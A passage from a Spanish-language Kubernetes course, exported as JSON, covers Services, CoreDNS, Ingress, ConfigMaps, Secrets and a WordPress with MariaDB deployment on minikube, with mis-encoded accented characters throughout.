80 se balancear√° la carga entre los Pods de Wordpress, accediendo a las IPs de los Pods de Wordpress al puerto 8080.\nEl Service NodePort ha asignado un puerto de acceso aleatorio (entre el 30000 - 40000) que nos permite acceder a la aplicaci√≥n mediante la IP del nodo master. En el ejemplo si accedemos a 10.0.2.4:30453 estaremos accediendo al Service que nos permitir√° acceder a la aplicaci√≥n.\n\nLoadBalancer\nEste tipo s√≥lo est√° soportado en servicios de cloud p√∫blico (GKE, AKS o AWS). El proveedor asignar√° un recurso de balanceo de carga para el acceso a los Services. Si usamos un cloud privado como OpenStack, necesitaremos un plugin para configurar el funcionamiento. Este tipo de Service no lo vamos a utilizar en el presente curso.\n\nComo vemos en el ejemplo, el cloud de infraestructura donde tengamos instalado el cluster nos ofrecer√° un recurso balanceador de carga con una IP accesible desde el exterior que nos permitir√° acceder a la aplicaci√≥n directamente."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.1-describiendo-services":{"title":"6.1-describiendo-services","links":[],"tags":[],"content":"6.1 Describiendo services\nServices NodePort\nSuponemos que tenemos desplegado nginx usando el fichero yaml: nginx-deployment.yaml:\nkubectl apply -f nginx-deployment.yaml\n\nPor lo tanto tenemos dos Pods ofreciendo el servidor web nginx, a los que queremos acceder desde el exterior y que se balancee la carga entre ellos.\nAunque podr√≠amos crear un recurso Service desde la l√≠nea de comandos:\nkubectl expose deployment/nginx --port=80 --type=NodePort\n\nNormalmente lo que hacemos es describir las caracter√≠sticas del Service en un fichero yaml nginx-srv.yaml:\napiVersion: v1\nkind: Service\nmetadata:\n  name: nginx\nspec:\n  type: NodePort\n  ports:\n  - name: service-http\n    port: 80\n    targetPort: http\n  selector:\n    app: nginx\n\nVeamos la descripci√≥n:\n\nVamos a crear un recurso Service (par√°metro kind) y lo nombramos como nginx (par√°metro name). Este nombre ser√° importante para la resoluci√≥n dns.\nEn la especificaci√≥n del recurso indicamos el tipo de Service (par√°metro type).\nA continuaci√≥n, definimos el puerto por el que va a ofrecer el Service y lo nombramos (dentro del apartado port: el par√°metro port y el par√°metro name). Adem√°s, debemos indicar el puerto en el que los Pods est√°n ofreciendo el Service (par√°metro targetPort), en este caso, hemos usado el nombre del puerto (http) que indicamos en el recurso Deployment:\n\n   ...\n   ports:\n    - name: http\n      containerPort: 80\n   ...\n\n\nPor ultimo, seleccionamos los Pods a los que vamos acceder y vamos a balancear la carga seleccionando los Pods por medio de sus etiquetas (par√°metro selector).\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.2-gestionando-los-services":{"title":"6.2-gestionando-los-services","links":[],"tags":[],"content":"6.2 Gestionando los services\nService de tipo NodePort\nPara aprender c√≥mo gestionamos los Services, vamos a trabajar con el Deployment de nginx (nginx-deployment.yaml) y el Service NodePort (nginx-srv.yaml) para acceder a los Pods de este despliegue desde el exterior.\nCreamos el Deployment\nEl primer paso ser√≠a crear el Deployment de nginx:\nkubectl apply -f nginx-deployment.yaml\n\nCreamos el Service\nA continuaci√≥n vamos a crear el Service de tipo NodePort que nos permitir√° acceder al servidor nginx.\nkubectl apply -f nginx-srv.yaml\n\nPara ver los Services que tenemos creado:\nkubectl get services\n\nRecuerda que si usamos kubectl get all tambi√©n se mostrar√°n los Services.\nAntes de acceder a la aplicaci√≥n podemos ver la informaci√≥n m√°s detallada del Service que acabamos de crear:\nkubectl describe service/nginx\nName:                     nginx\n...\nSelector:                 app=nginx\nType:                     NodePort\n...\nIP:                       10.110.81.74\nPort:                     service-http  80/TCP\nTargetPort:               http/TCP\nNodePort:                 service-http  32717/TCP\nEndpoints:                172.17.0.3:80,172.17.0.4:80\n...\n\nPodemos ver la etiqueta de los Pods a los que accede (Selector). El tipo de Service (Type). La IP virtual que ha tomado (CLUSTER-IP) y que es accesible desde el cluster (IP). El puerto por el que ofrece el Service (Port). El puerto de los Pods a los que redirige el tr√°fico (TargetPort). Al ser un service de tipo NodePort nos da informaci√≥n del puerto que se asignado para acceder a la aplicaci√≥n (NodePort). Y por √∫ltimo, podemos ver las IPs de los Pods que ha seleccionado y sobre los que balancear√° la carga (Endpoints).\nAccediendo a la aplicaci√≥n\nVemos el Service que hemos creado:\nkubectl get services\n...\nnginx        NodePort    10.110.81.74   &lt;none&gt;        80:32717/TCP   32s\n\nObservamos que se ha asignado el puerto 32717 para el acceso, por lo tanto si desde un navegador accedemos a la IP del nodo master y a este puerto podremos ver la aplicaci√≥n.\n¬øC√≥mo s√© la direcci√≥n ip del nodo master del cluster minikube? Podemos ejecutar:\nminikube ip\n192.168.39.222\n\nY ya podemos acceder desde un navegador web:\n\nService ClusterIP\nEn esta ocasi√≥n vamos a desplegar una base de datos MariaDB. En este caso no vamos a necesitar acceder a la base de datos desde el exterior, pero necesitamos que los Pods de otro despliegue puedan acceder a ella. Por lo tanto vamos a crear un Service de tipo ClusterIP.\nPara el despliegue de MariaDB vamos a usar el fichero mariadb-deployment.yaml. Puedes comprobar que en la definici√≥n del contenedor hemos a√±adido la secci√≥n env que nos permite establecer variables de entorno para configurar el contenedor (los estudiaremos en el siguiente m√≥dulo).\nPara la creaci√≥n del Service utilizamos el fichero mariadb-srv.yaml.\nPara la creaci√≥n del Deployment y el Service vamos ejecutando las siguientes instrucciones:\nkubectl apply -f mariadb-deployment.yaml\nkubectl apply -f mariadb-srv.yaml\n\nComprobamos el Service creado:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP       2m22s\n\nkubectl describe service/mariadb\nName:              mariadb\n...\nSelector:          app=mariadb\nType:              ClusterIP\n...\nIP:                10.106.60.233\nPort:              service-bd  3306/TCP\nTargetPort:        db-port/TCP\nEndpoints:         172.17.0.5:3306\n...\n\nPodemos comprobar que no se ha mapeado un puerto aleatorio para que accedamos usando la IP del nodo master. Los Pods que accedan a la IP 10.106.60.233 o al nombre mariadb y al puerto 3306 estar√°n accediendo al Pod (172.17.0.5:3306) del despliegue de mariadb.\nEliminando los servicios\nPor ejemplo para borrar el servicio mariadb, ejecutar√≠amos:\nkubectl delete service mariadb\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.3-servicio-dns-en-kubernetes":{"title":"6.3-servicio-dns-en-kubernetes","links":[],"tags":[],"content":"6.3 Servicio DNS en Kubernetes\nExiste un componente de Kubernetes llamado CoreDNS, que ofrece un servidor DNS interno para que los Pods puedan resolver diferentes nombres de recursos (Services, Pods, ‚Ä¶) a direcciones IP.\nCada vez que se crea un nuevo recurso Service se crea un registro de tipo A con el nombre:\n&lt;nombre_servicio&gt;.&lt;nombre_namespace&gt;.svc.cluster.local.\n\nComprobemos el servidor DNS\nPartimos del punto anterior donde tenemos creados los dos Services:\nkubectl get services\nmariadb      ClusterIP   10.106.60.233   &lt;none&gt;        3306/TCP\nnginx        NodePort    10.110.81.74    &lt;none&gt;        80:32717/TCP\n\nPara comprobar el servidor DNS de nuestro cluster y que podemos resolver los nombres de los distintos Services, vamos a usar un Pod (busybox.yaml) creado desde una imagen busybox. Es una imagen muy peque√±a pero con algunas utilidades que nos vienen muy bien:\nkubectl apply -f busybox.yaml\n\n¬øQu√© servidor DNS est√° configurado en los Pods que estamos creando? Podemos ejecutar la siguiente instrucci√≥n para comprobarlo:\nkubectl exec -it busybox -- cat /etc/resolv.conf\nnameserver 10.96.0.10\nsearch default.svc.cluster.local svc.cluster.local cluster.local\n\n\nEl servidor DNS (componente coreDNS) tiene asignado la IP del cluster 10.96.0.10.\nPodemos utilizar el nombre corto del Service, porque buscar√° el nombre del host totalmente cualificado usando los dominios indicados en el par√°metro search. Como vemos el primer nombre de dominio es el que se crea con los Services: default.svc.cluster.local (recuerda que el namespace que estamos usando es default).\n\nVamos a comprobar que realmente se han creado dos registros A para cada uno de los Service, haciendo consultas DNS:\nkubectl exec -it busybox -- nslookup nginx\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tnginx.default.svc.cluster.local\nAddress: 10.110.81.74\n\nVemos que ha hecho la resoluci√≥n del nombre nginx con la IP correspondiente a su servicio. Y con el Service mariadb tambi√©n lo podemos hacer:\nkubectl exec -it busybox -- nslookup mariadb\nServer:\t\t10.96.0.10\nAddress:\t10.96.0.10:53\n\nName:\tmariadb.default.svc.cluster.local\nAddress: 10.106.60.233\n\nTambi√©n podemos comprobar que usando el nombre podemos acceder al servicio:\nkubectl exec -it busybox -- wget http://nginx\nConnecting to nginx (10.110.81.74:80)\nsaving to &#039;index.html&#039;\n...\n\nPodemos concluir que, cuando necesitemos acceder desde alguna aplicaci√≥n desplegada en nuestro cluster a otro servicio ofrecido por otro despliegue, utilizaremos el nombre que hemos asignado a su Service de acceso. Por ejemplo, si desplegamos un Wordpress y un servidor de base de datos mariadb, y creamos dos Services: uno de tipo NodePort para acceder desde el exterior al CMS, y otro, que llamamos mariadb de tipo ClusterIP para acceder ala base de datos, cuando tengamos que configurar el Wordpress para indicar la direcci√≥n de la base de datos, pondremos mariadb."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.4-ingress-controller":{"title":"6.4-ingress-controller","links":[],"tags":[],"content":"6.4 Ingress Controller\nHasta ahora tenemos dos opciones principales para acceder a nuestras aplicaciones desde el exterior:\n\nUtilizando Services del tipo NodePort: Esta opci√≥n no es muy viable para entornos de producci√≥n ya que tenemos que utilizar puertos aleatorios desde 30000-40000.\nUtilizando Services del tipo LoadBalancer: Esta opci√≥n s√≥lo es v√°lida si trabajamos en un proveedor Cloud que nos ofrece un balanceador de carga para cada una de las aplicaciones, en cloud p√∫blico puede ser una opci√≥n muy cara.\n\nLa soluci√≥n puede ser utilizar un Ingress controller que nos permite utilizar un proxy inverso (HAproxy, nginx, traefik,‚Ä¶) que por medio de reglas de encaminamiento que obtiene de la API de Kubernetes, nos permite el acceso a nuestras aplicaciones por medio de nombres.\nInstalaci√≥n de Ingress Controller en minikube\nCuando hacemos una instalaci√≥n de minikube el componente de Ingress Controller no viene instalada por defecto. minikube nos ofrece un conjunto de addons que al activarlos nos instalan un determinado componente que nos ofrece una funcionalidad adicional. Para ver los addons que nos ofrece minikube podemos ejecutar:\nminikube addons list\n\nPara activar el Ingress Controller ejecutamos:\nminikube addons enable ingress\n\nPara comprobar si tenemos instalado el componente, podemos visualizar los Pods creados en el namespace ingress-nginx. Este espacio de nombre se ha creado para desplegar el controlador de ingress Por lo tanto al ejecutar:\nkubectl get pods -n ingress-nginx\n...\ningress-nginx-controller-558664778f-shjzp   1/1     Running     0\n...\n\nDebe aparece un Pod que se llama ingress-nginx-controller-..., si es as√≠, significa que se ha instalado un Ingress Controller basado en el proxy inverso nginx.\n\nDescribiendo el recurso Ingress\nUna vez instalado el componente Ingress Controller, ya podemos definir un recurso Ingress en un fichero yaml. Para ello vamos a trabajar con el despliegue y el Service que hemos creado de nginx.\nEl recurso Ingress para acceder a nuestro despliegue de nginx lo tenemos en el fichero ingress.yaml:\napiVersion: networking.k8s.io/v1\nkind: Ingress\nmetadata:\n  name: nginx\nspec:\n  rules:\n  - host: www.example.org\n    http:\n      paths:\n      - path: /\n        pathType: Prefix\n        backend:\n          service:\n            name: nginx\n            port:\n              number: 80\n\nHemos indicado el tipo de recurso Ingress (kind) y le hemos puesto un nombre (name). A continuaci√≥n en la especificaci√≥n del recurso vamos a poner una regla que relaciona un nombre de host con un Service que me permita el acceso a una aplicaci√≥n:\n\nhost: Indicamos el nombre de host que vamos a usar para el acceso. Este nombre debe apuntar a la ip del nodo master.\npath: Indicamos el path de la url que vamos a usar, en este caso ser√≠a la ruta ra√≠z: /. Esto nos sirve por si queremos servir la aplicaci√≥n en una ruta determinada, por ejemplo: www.example.org/app1.\npathType: No es importante, nos permite indicar c√≥mo se van a trabajar con las URL.\nbackend: Indicamos el Service al que vamos a acceder. En este caso indicamos el nombre del Service (service/name) y el puerto del Service (service/port/number).\n\nCuando se crea el recurso, y accedamos al nombre indicado, un proxy inverso redirigir√° las peticiones HTTP a la IP y al puerto del Service correspondiente. Nota: Utilizando Ingress no es necesario que los Services sean de tipo NodePort para acceder a la aplicaci√≥n desde el exterior.\nGestionando el recurso Ingress\nPara crear el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY podemos ver el recurso Ingress que hemos creado:\nkubectl get ingress\n\nY obtener informaci√≥n detallada del recurso con:\nkubectl describe ingress/nginx\n\n\nAccediendo a la aplicaci√≥n\nComo no tenemos un servidor DNS que nos permita gestionar los nombres que vamos a utilizar para el acceso a las aplicaciones, vamos a usar resoluci√≥n est√°tica. Para ello como root a√±adimos una nueva l√≠nea en el fichero /etc/hosts, indicando el nombre (www.example.org) y la ip a la que corresponde, la ip del nodo master:\n192.168.39.222  www.example.org\n\nY ya podemos acceder a la aplicaci√≥n usando el nombre:\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/6.-acceso-a-las-aplicaciones-services/6.5-ejemplo-completo-aplicacion-de-temperaturas":{"title":"6.5-ejemplo-completo-aplicacion-de-temperaturas","links":[],"tags":[],"content":"6.5 Ejemplo completo: aplicaci√≥n de temperaturas\nVamos a hacer un despliegue completo de una aplicaci√≥n llamada Temperaturas. Esta aplicaci√≥n nos permite consultar la temperatura m√≠nima y m√°xima de todos los municipios de Espa√±a y estar√° formada por dos microservicios:\n\nfrontend: Es una aplicaci√≥n escrita en Python que nos ofrece una p√°gina web para hacer las b√∫squedas y visualizar los resultados. Este microservicio har√° peticiones HTTP al segundo microservicio para obtener la informaci√≥n.\nbackend: Es el segundo microservicio que nos ofrece un servicio web de tipo API Restful. A esta API Web podemos hacerles consultas sobre los municipios y sobre las temperaturas.\n\nAlgunas consideraciones sobre el despliegue que vamos a realizar:\n\nComo la aplicaci√≥n est√° formada por dos microservicios, tendremos que crear dos recursos Deployment para desplegar y controlar los Pods de cada despliegue por separado.\nNecesitaremos acceder desde el exterior al microservicio frontend por lo que crearemos un recurso Service de tipo NodePort.\nAl componente backend no es necesario acceder desde el exterior, por lo tanto crearemos un recurso Service de tipo ClusterIP para permitir que se acceda desde frontend.\nPara terminar usaremos un recurso Ingress para acceder al componente frontend por lo tanto, en ese momento, no es necesario que el Service para acceder a ese componente sea de tipo NodePort, bastar√≠a con que fuera ClusterIP.\n\n\nDespliegue y acceso al microservicio frontend\nEn primer lugar vamos a desplegar el primer microservicio. Esta aplicaci√≥n est√° usando el puerto 3000/tcp para ofrecer la aplicaci√≥n. Para describir el despliegue utilizaremos el fichero frontend-deployment.yaml y para crear el despliegue ejecutaremos la siguiente instrucci√≥n:\nkubectl apply -f frontend-deployment.yaml\n\nA continuaci√≥n usamos el fichero frontend-srv.yaml para crear el Service NodePort:\nkubectl apply -f frontend-srv.yaml\n\nObtenemos los recursos que hemos creado. Nos fijamos en el puerto que nos ha asignado por el Service NodePort (en mi caso el 30053). Vamos a acceder desde un navegador web usando la ip del nodo master y el puerto que nos han asignado:\n\nComo podemos observar la aplicaci√≥n nos muestra un mensaje de error: ‚ÄúNo puedo conectar con el servidor de temperaturas‚Ä¶. Evidentemente el componente frontend est√° intentando conectar con el componente backend y, evidentemente, no puede, ya que ni la hemos desplegado, ni hemos creado el Service correspondiente.\n\nDespliegue y acceso al microservicio backend\nEs el momento de desplegar el segundo microservicio. Este microservicio ofrece un servicio API Restful en el puerto 5000/tcp. Para ello utilizaremos el fichero backend-deployment.yaml para realizar el despliegue y el fichero backend-srv.yaml para crear el Service.\nkubectl apply -f backend-deployment.yaml\nkubectl apply -f backend-srv.yaml\n\nSi volvemos acceder al navegador y refrescamos la p√°gina, veremos que ya no nos sale el mensaje de error y podemos buscar la temperatura de nuestra ciudad:\n\nNota: Por defecto el componente frontend hace peticiones al componente backend utilizando el nombre temperaturas-backend, que es el nombre que hemos asignado al Service ClusterIP para el acceso al backend. En el pr√≥ximo m√≥dulo veremos como podemos cambiar la configuraci√≥n de frontend para cambiar el nombre del servicio web al que conecta.\n\nAlgunas consideraciones acerca del despliegue que hemos realizado\nEsta manera de trabajar donde cada microservicio que forma parte de la aplicaci√≥n (o si tenemos una aplicaci√≥n que necesite varios servicios (servidor web, servidor de base de datos,‚Ä¶)) se despliega de forma separada usando distintos recursos Deployment nos proporciona las siguientes caracter√≠sticas:\n\nCada conjunto de Pods creado en cada despliegue ejecutar√° un solo proceso para ofrecer un servicio o microservicio.\nCada conjunto de Pods se puede escalar de manera independiente. Esto es importante ya que si identificamos que al acceder a alguno de los servicios se crea un cuello de botella, podemos escalarlo para tener m√°s Pods ejecutando el servicio. En el ejemplo que hemos desarrollado, se crearon 3 Pods del frontend y un Pod del backend, pero se pueden escalar independientemente los dos despliegues. Te invito a escalar los dos despliegues y comprobar que sigue funcionando la aplicaci√≥n.\nLas actualizaciones de los distintos servicios / microservicios no interfieren en el resto.\nLo estudiaremos en un m√≥dulo posterior, pero podremos gestionar el almacenamiento de cada servicio de forma independiente.\nYa lo hemos comentado, pero con esta aplicaci√≥n podemos observar el balanceo de carga que realiza el Service al acceder al frontend: la aplicaci√≥n visualiza el nombre del servidor que est√° ofreciendo la p√°gina. Por lo tanto si vamos refrescando la p√°gina con F5 observaremos c√≥mo se va realizando el balanceo de carga y va cambiando el nombre del Pod al que est√° accediendo.\n\n\nAcceso a la aplicaci√≥n usando el Ingress Controller\nPara terminar vamos a crear un recurso Ingress que nos posibilite acceder a la aplicaci√≥n utilizando un nombre. Como hemos indicado al utilizar Ingress no es necesario que el Service al que accede sea de tipo NodePort, por lo tanto lo primero que vamos a hacer es cambiar el tipo de Service que accede a frontend y lo vamos a poner ClusterIP, para ello vamos a modificar el fichero frontend-srv.yaml cambiando el tipo de Service de NodePort a ClusterIP, y posteriormente aplicamos los cambios:\nkubectl apply -f frontend-srv.yaml\n\nComprobamos que realmente ha cambiado el tipo de Service, y que ya no tenemos un puerto para acceder usando la ip del nodo master.\nA continuaci√≥n usamos el fichero ingress.yaml para crear el recurso Ingress, que definir√° el nombre del host www.temperaturas.org que tendremos que introducir en la resoluci√≥n est√°tica tay como hemos visto anteriormente. Por lo tanto modificamos el fichero /etc/hosts de nuestro ordenador con la siguiente l√≠nea:\n192.168.39.222  www.temperaturas.org\n\nCreamos el recurso Ingress:\nkubectl apply -f ingress.yaml\n\nY accedemos a la aplicaci√≥n usando el nombre:\n\nEsquema\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.0-despliegue-parametrizados":{"title":"7.0-despliegue-parametrizados","links":[],"tags":[],"content":"7. Despliegues parametrizados\nEn muchas ocasiones necesitamos parametrizar nuestros despliegues, para ello podemos guardar informaci√≥n de distinta forma. En este m√≥dulo vamos a estudiar distintas maneras de guardar informaci√≥n en kubernetes, que nos permitir√° posteriormente parametrizar los Deployments:\n\nVariables de entorno\nConfigMaps\nSecrets\n\nTerminaremos estudiaremos un ejemplo completo donde desplegaremos un WoordPress + MariaDB."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.1-variables-de-entorno":{"title":"7.1-variables-de-entorno","links":[],"tags":[],"content":"7.1 Variables de entorno\nPara a√±adir alguna configuraci√≥n espec√≠fica a la hora de lanzar un contenedor, se usan variables de entorno del contenedor cuyos valores se especifican al crear el contenedor para realizar una configuraci√≥n concreta del mismo.\nPor ejemplo, si estudiamos la documentaci√≥n de la imagen mariadb en Docker Hub, podemos comprobar que podemos definir un conjunto de variables de entorno como MYSQL_ROOT_PASSWORD, MYSQL_DATABASE, MYSQL_USER, MYSQL_PASSWORD, etc., que nos permitir√°n configurar de alguna forma determinada nuestro servidor de base de datos (indicando la contrase√±a del usuario root, creando una determinada base de datos o creando un usuario con una contrase√±a por ejemplo.\nDe la misma manera, al especificar los contenedores que contendr√°n los Pods que se van a crear desde un Deployment, tambi√©n se pondr√°n inicializar las variables de entorno necesarias.\nConfiguraci√≥n de aplicaciones usando variables de entorno\nVamos a hacer un despliegue de un servidor de base de datos mariadb. Si volvemos a estudiar la documentaci√≥n de esta imagen en Docker Hub comprobamos que obligatoriamente tenemos que indicar la contrase√±a del usuario root inicializando la variable de entorno MYSQL_ROOT_PASSWORD. El fichero de despliegue que vamos a usar es mariadb-deployment-env.yaml, y vemos el fragmento del fichero donde se define el contenedor:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              value: my-password\n\nEn el apartado containers hemos incluido la secci√≥n env donde vamos indicando, como una lista, el nombre de la variable (name) y su valor (value). En este caso hemos indicado la contrase√±a my-password.\nVamos a comprobar si realmente se ha creado el servidor de base de datos con esa contrase√±a del root:\nkubectl apply -f mariadb-deploymen-env.yaml\n\nkubectl get all\n...\nNAME                                 READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/mariadb-deployment   1/1     1            1           5s\n\nkubectl exec -it deployment.apps/mariadb-deployment -- mysql -u root -p\nEnter password:\n...\nMariaDB [(none)]&gt;\n"},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.2-configmaps":{"title":"7.2-configmaps","links":[],"tags":[],"content":"7.2 ConfigMaps\nEn el apartado anterior hemos estudiado como podemos definir las variables de entorno de los contenedores que vamos a desplegar. Sin embargo, la soluci√≥n que presentamos puede tener alguna limitaci√≥n:\n\nLos valores de las variables de entorno est√°n escritos directamente en el fichero yaml. Estos ficheros yaml suelen estar en repositorios git y l√≥gicamente no es el sitio m√°s adecuado para ubicarlos.\nPor otro lado, escribiendo los valores de las variables de entorno directamente en los ficheros, hacemos que estos ficheros no sean reutilizables en otros despliegues y que el procedimiento de cambiar las variables sea tedioso y propenso a errores, porque hay que hacerlo en varios sitios.\n\nPara solucionar estas limitaciones, podemos usar un nuevo recurso de Kubernetes llamado ConfigMap.\nConfiguraci√≥n de aplicaciones usando ConfigMaps\nConfigMap permite definir un diccionario (clave,valor) para guardar informaci√≥n que se puede utilizar para configurar una aplicaci√≥n.\nAunque hay distintas formas de indicar el conjunto de claves-valor de nuestro ConfigMap, en este caso vamos a usar literales, por ejemplo:\nkubectl create cm mariadb --from-literal=root_password=my-password \\\n                          --from-literal=mysql_usuario=usuario     \\\n                          --from-literal=mysql_password=password-user \\\n                          --from-literal=basededatos=test\n\nEn el ejemplo anteriore, hemos creado un ConfigMap llamado mariadb con cuatro pares clave-valor. Para ver los ConfigMap que tenemos creados, podemos utilizar:\nkubectl get cm\n\nY para ver los detalles del mismo:\nkubectl describe cm mariadb\n\nUna vez que creado el ConfigMap se puede crear un despliegue donde las variables de entorno se inicializan con los valores guardados en el ConfigMap. Por ejemplo, un despliegue de una base de datos lo podemos encontrar en el fichero mariadb-deployment-configmap.yaml y el fragmento donde definimos las variables de entorno quedar√≠a:\n...\n    spec:\n      containers:\n        - name: contenedor-mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: root_password\n            - name: MYSQL_USER\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_usuario\n            - name: MYSQL_PASSWORD\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: mysql_password\n            - name: MYSQL_DATABASE\n              valueFrom:\n                configMapKeyRef:\n                  name: mariadb\n                  key: basededatos\n\nObservamos como al indicar las variables de entorno (secci√≥n env) seguimos indicado el nombre (name) pero el valor se indica con una clave de un ConfigMap (valueFrom: - configMapKeyRef:), para ello se indica el nombre del ConfigMap (name) y el valor que tiene una determinada clave (key). De esta manera, no guardamos en los ficheros yaml los valores espec√≠ficos de las variables de entorno, y adem√°s, estos valores se pueden reutilizar para otros despliegues, por ejemplo, al desplegar un CMS indicar los mismos valores para las credenciales de acceso a la base de datos."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.3-secrets":{"title":"7.3-secrets","links":[],"tags":[],"content":"7.3 Secrets\nCuando en un variable de entorno indicamos una informaci√≥n sensible, como por ejemplo, una contrase√±a o una clave ssh, es mejor utilizar un nuevo recurso de Kubernetes llamado Secret.\nLos Secrets permiten guardar informaci√≥n sensible que ser√° codificada o cifrada.\nHay distintos tipos de Secret, en este curso vamos a usar los gen√©ricos y los vamos a crear a partir de un literal. Por ejemplo para guardar la contrase√±a del usuario root de una base de datos, crear√≠amos un Secret de la siguiente manera:\nkubectl create secret generic mariadb --from-literal=password=my-password\n\nPodemos obtener informaci√≥n de los Secret que hemos creado con las instrucciones:\nkubectl get secret\nkubectl describe secret mariadb\n\nVeamos a continuaci√≥n c√≥mo quedar√≠a un despliegue que usa el valor de un Secret para inicializar una variable de entorno. Vamos a usar el fichero mariadb-deployment-secret.yaml y el fragmento donde definimos las variables de entorno quedar√≠a:\n...\n    spec:\n      containers:\n        - name: mariadb\n          image: mariadb\n          ports:\n            - containerPort: 3306\n              name: db-port\n          env:\n            - name: MYSQL_ROOT_PASSWORD\n              valueFrom:\n                secretKeyRef:\n                  name: mariadb\n                  key: password\n\nObservamos como al indicar las variables de entorno (secci√≥n env) seguimos indicado el nombre (name) pero el valor se indica con un valor de un Secret (valueFrom: - secretKeyRef:), indicando el nombre del Secret (name) y la clave correspondiente. (key)."},"DAW/Despliegue-de-aplicaciones-web/kubernetes/7.-despliegues-parametrizados/7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb":{"title":"7.4-ejemplo-completo-despliegue-y-acceso-a-wordpress-+-mariadb","links":[],"tags":[],"content":"7.4 Ejemplo completo: Despliegue y acceso a Wordpress + MariaDB\nEn este ejemplo vamos a desplegar el CMS Wordpress y la base de datos MariaDB para su correcto funcionamiento. Cada uno de los servicios se van a desplegar independientemente, y configuraremos los Services para acceder desde el exterior a la aplicaci√≥n y para que el Wordpress pueda acceder a la base de datos:\nConfiguraci√≥n de los contenedores\n\nComo hemos estudiado en los ejemplos vistos en este m√≥dulo, al crear el despliegue de MariaDB tendremos que configurar las siguientes variables de entorno: MYSQL_ROOT_PASSWORD (contrase√±a del usuario root de la base de datos), MYSQL_DATABASE (el nombre de la base de datos que se va a crear), MYSQL_USER (nombre del usuario de la base de datos que se va carear), MYSQL_PASSWORD (contrase√±a de este usuario).\nSi comprobamos la documentaci√≥n de la imagen Wordpress en Docker Hub las variables de entorno que vamos a definir son las siguientes: WORDPRESS_DB_HOST (la direcci√≥n del servidor de base de datos), WORDPRESS_DB_USER (el usuario que se va a usar para acceder a la base de datos), WORDPRESS_DB_PASSWORD (la contrase√±a de dicho usuario) y WORDPRESS_DB_NAME (el nombre de la base de datos a las que vamos a conectar para gestionar las tablas de Wordpress).\n\nEvidentemente los valores de estas variables tienen que coincidir, es decir, el usuario y la contrase√±a que creemos en la base de datos ser√°n las mismas que utilicemos desde Wordpress para acceder a la base de datos, y el nombre de la base de datos usada por WordPres ser√° el mismo que la base de datos creada en MariaDB.\nLo veremos posteriormente, pero adelantamos, que el valor de la variable WORDPRESS_DB_HOST ser√° el nombre del Service que creemos para acceder a la base de datos, como ya hemos estudiado, se crear√° un registro en el DNS del cluster que permitir√° que Wordpress acceda a la base de datos usando el nombre del Service.\nLos valores para crear la base de datos y el usuario en MariaDB, que corresponden a las credenciales que vamos a usar en Wordpress, los vamos a guardar en dos recursos de nuestro cluster: los datos no sensibles (nombre de usuario y nombre de la base de datos) lo guardaremos en un ConfigMap y los datos sensibles, las contrase√±as, la guardaremos en un Secret.\nPara ello ejecutamos las siguientes instrucciones:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234\n\nNota: No hemos guardado la definici√≥n del ConfigMap y el Secret en un fichero yaml. De esta manera evitamos que informaci√≥n sensible sea guardada por ejemplo en un repositorio git.\nSin embargo, a partir de las instrucciones anteriores podemos generar ficheros yaml que posteriormente a√±adimos a la configuraci√≥n del cluster. Podemos ejecutar:\nkubectl create cm bd-datos --from-literal=bd_user=user_wordpress \\\n                           --from-literal=bd_dbname=wordpress \\\n                           -o yaml --dry-run=client &gt; bd_datos_configmap.yaml\n\nkubectl create secret generic bd-passwords --from-literal=bd_password=password1234 \\\n                                           --from-literal=bd_rootpassword=root1234 \\\n                                           -o yaml --dry-run=client &gt; bd_passwords_secret.yaml\n\nCon la opci√≥n --dry-run=client, kubectl va a simular la creaci√≥n del recurso, pero no se llega a ejecutar, sin embargo con la opci√≥n -o yaml generamos el fichero yaml con la definici√≥n del recurso. Posteriormente s√≥lamente tendremos que ejecutar las siguientes instrucciones para crear los dos recursos:\nkubectl apply -f bd_datos_configmap.yaml\nkubectl apply -f bd_passwords_secret.yaml\n\nDespliegue de la base de datos\nPara desplegar la base de datos vamos a usar el fichero mariadb-deployment.yaml. Podemos observar en el fichero c√≥mo los datos de las variables de entorno del contenedor se inicalizan con los valores que hemos creado en el ConfigMap y en el Secret anterior. Ejecutamos:\nkubectl apply -f mariadb-deployment.yaml\n\nLa definici√≥n del Service que vamos a crear lo tenemos en el fichero: mariadb-srv.yaml. Como comprobamos en la definici√≥n estamos creando un Service del tipo ClusterIP, ya que no vamos a acceder a la base de datos desde el exterior. Adem√°s es importante recordar el nombre que hemos puesto al Service (mariadb-service), ya que c√≥mo hemos indicado posteriormente, usaremos este nombre para configurar la aplicaci√≥n Wordpress a la hora de indicar el servidor de base de datos. Ejecutamos:\nkubectl apply -f mariadb-srv.yaml\n\nDespliegue de la aplicaci√≥n Wordpress\nPara desplegar la aplicaci√≥n Wordpress vamos a usar el fichero wordpress-deployment.yaml. Podemos observar 